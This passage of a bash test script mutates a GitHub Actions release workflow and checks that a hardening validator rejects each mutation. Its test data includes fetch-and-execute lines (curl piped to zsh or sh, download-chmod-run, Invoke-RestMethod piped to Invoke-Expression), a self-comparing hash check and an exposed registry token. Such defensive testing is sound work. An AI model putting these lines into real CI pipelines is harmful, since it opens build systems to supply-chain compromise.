  '      - name: Build artifacts
        shell: bash' \
  '      - name: Build artifacts'

# 61. curl | tee x | zsh in announce
apply_replace "pipe-tee-zsh-in-announce" "curl ... | tee x | zsh added to announce" \
  '    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
  '    steps:
      - run: curl -sSf https://example.com/bad | tee x | zsh
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'

# 62. irm piped to iex in windows step
apply_replace "irm-piped-to-iex" "Invoke-RestMethod piped to Invoke-Expression" \
  'Invoke-RestMethod -Uri $url -OutFile $dest' \
  'Invoke-RestMethod -Uri $url | Invoke-Expression'

# 63. shell: pwsh on Build artifacts
apply_replace "build-artifacts-shell-pwsh" "shell: pwsh on Build artifacts step" \
  '      - name: Build artifacts
        shell: bash' \
  '      - name: Build artifacts
        shell: pwsh'

# 64. curl -o x && chmod +x x && ./x (no .sh suffix)
apply_replace "unix-download-chmod-exec" "curl -o x && chmod +x x && ./x in Unix step" \
  '          chmod +x ~/.cargo/bin/dist' \
  '          chmod +x ~/.cargo/bin/dist
          curl -o x https://example.com/bad && chmod +x x && ./x'

# 65. Malformed null env in step
apply_replace "malformed-null-env-and-steps" "env: null on step handled cleanly without crash" \
  '      - name: Push formula
        env:
          HOMEBREW_TAP_TOKEN: ${{ secrets.HOMEBREW_TAP_TOKEN }}' \
  '      - name: Push formula
        env: null'

echo ""
echo "=== PowerShell and Shell Execution Hardening Mutations ==="

# 66. Invalid variable syntax $archive: in Windows install step
apply_pwsh_replace "windows-powershell-syntax-archive-colon" "Invalid variable syntax \$archive: in Windows install step" \
  '${archive}:' \
  '$archive:'

# 67. Invalid variable syntax $archive: in enable windows longpaths step
apply_pwsh_replace "longpaths-powershell-syntax-archive-colon" "Invalid variable syntax \$archive: in enable windows longpaths step" \
  'git config --global core.longpaths true' \
  'git config --global core.longpaths true
          Write-Host "$archive: longpaths enabled"'

# 68. Uppercase IEX in Windows step
apply_replace "pipe-to-uppercase-iex" "Execution piped to uppercase IEX" \
  'Expand-Archive -Path $dest -DestinationPath $binDir -Force' \
  'Expand-Archive -Path $dest -DestinationPath $binDir -Force
          Write-Output "dist" | IEX'

# 69. Piping through env -i sh
apply_replace "pipe-env-interpreter-sh" "Piping through env -i sh" \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
  '      - run: curl -sSf https://example.com/bad | env -i sh
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'

# 70. Dot-sourcing local script . ./x.ps1
apply_replace "dot-source-local-script" "Dot-sourcing local script . ./x.ps1" \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
  '      - run: . ./x.ps1
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'

# 71. Unix dist install step contains set +o errexit
apply_replace "unix-dist-set-plus-o-errexit" "Unix dist install step contains set +o errexit" \
  '      - name: Install dist (Unix)
        if: runner.os != '\''Windows'\''
        shell: bash
        run: |' \
  '      - name: Install dist (Unix)
        if: runner.os != '\''Windows'\''
        shell: bash
        run: |
          set +o errexit'

# 72. Windows step compares actualHash to actualHash
apply_replace "windows-hash-check-compares-actual-to-self" "Windows step compares actualHash to actualHash" \
  'if ($actualHash -ne $expectedHash) {' \
  'if ($actualHash -ne $actualHash) {'

echo ""
echo "=== Malformed YAML and Structural Shape Mutations ==="

# 73. Step with non-string integer run value
apply_replace "step-run-non-string-integer" "Step with non-string integer run value" \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
  '      - name: odd run integer
        run: 123
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'

# 74. actions/checkout step with non-mapping string with value
apply_replace "checkout-with-non-mapping-string" "actions/checkout step with non-mapping string with value" \
  '        with:
          persist-credentials: false
          submodules: recursive' \
  '        with: "x"'

# 75. install-action step with non-string integer tool value
apply_replace "install-action-tool-non-string-integer" "install-action step with non-string integer tool value" \
  '        with:
          tool: cargo-auditable@0.7.7' \
  '        with:
          tool: 7'

# 76. install-action step with non-string sequence tool value
apply_replace "install-action-tool-non-string-sequence" "install-action step with non-string sequence tool value" \
  '        with:
          tool: cargo-auditable@0.7.7' \
  '        with:
          tool: [cargo-auditable@0.7.7]'

# 77. Step with non-string sequence name value
apply_replace "step-name-non-string-sequence" "Step with non-string sequence name value" \
  '      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1' \
  '      - name: [odd-step-name]
        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1'

# 78. publish-crates.yml has CARGO_REGISTRY_TOKEN in job-level env
apply_publish_crates_replace "publish-crates-token-in-job-env" "publish-crates.yml has CARGO_REGISTRY_TOKEN in job-level env" \
  '    environment: release' \
  '    environment: release
    env:
      CARGO_REGISTRY_TOKEN: ${{ secrets.CARGO_REGISTRY_TOKEN }}'

echo ""
echo "=== Control Test (Semantic Equivalence) ==="

# 79. Reordered jobs mapping (semantically valid, must pass)
mut_file="$tmpdir/jobs-reordered-valid.yml"
uv run --no-project --with pyyaml==6.0.3 python -I - "$orig_workflow" "$mut_file" << 'PYEOF'
import sys, yaml
with open(sys.argv[1], 'r', encoding='utf-8') as f:
    data = yaml.safe_load(f)
j = data["jobs"]
reordered = {
    "announce": j["announce"],
    "plan": j["plan"],
    "build-local-artifacts": j["build-local-artifacts"],
    "build-global-artifacts": j["build-global-artifacts"],
    "host": j["host"],
    "prepare-homebrew-formula": j["prepare-homebrew-formula"],
    "publish-homebrew-formula": j["publish-homebrew-formula"],
    "custom-publish-crates": j["custom-publish-crates"]
}
data["jobs"] = reordered
with open(sys.argv[2], 'w', encoding='utf-8') as out:
    yaml.dump(data, out, sort_keys=False)
PYEOF
assert_control_passes "jobs-reordered-valid" "Reordered jobs mapping passes check" "$mut_file"

echo ""
echo "=== Test Summary ==="
echo "Total tests run: $((passed_count + failed_count + skipped_count))"
echo "Tests passed (PASS): $passed_count"
if [ "$skipped_count" -gt 0 ]; then
  echo "Tests skipped (SKIP): $skipped_count"
fi
echo "Tests failed (FAIL): $failed_count"

if [ "$failed_count" -gt 0 ]; then
  echo "ERROR: $failed_count tests failed!" >&2
  exit 1
fi

echo "SUCCESS: All mutations were rejected and all controls passed."
